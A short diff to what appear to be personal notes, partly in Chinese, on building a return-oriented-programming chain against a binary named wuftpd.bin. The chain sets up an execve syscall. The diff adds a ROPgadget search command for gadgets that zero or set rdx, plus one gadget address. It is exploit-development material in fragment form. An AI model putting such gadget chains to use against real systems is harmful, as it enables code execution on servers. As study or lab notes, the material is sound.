@@ -62,11 +62,15 @@ pop eax, ret  | mov eax, 0x3b
 syscall_addr
 -------------------
 设置rdx|edx -> 0
+ROPgadget --binary wuftpd.bin | grep -v "retf" | grep "ret" | grep -v "\[rdx" | grep -v "\[edx" | grep "dx"
+
 shl edx
 xor
 mov rdx, qword ptr [rbp - 8] ; mov qword ptr [rax], rdx ; pop rbp ; ret
 xor edx, edx ; mov eax, edx ; pop rbx ; ret
 shl edx, 4 ; add eax, edx ; ret  *8 time
+
+0x0000000000423e58 : movzx edx, word ptr [rbp - 0x1c] ; mov word ptr [rax + 0x10], dx ; pop rbp ; ret
 
 ```
 
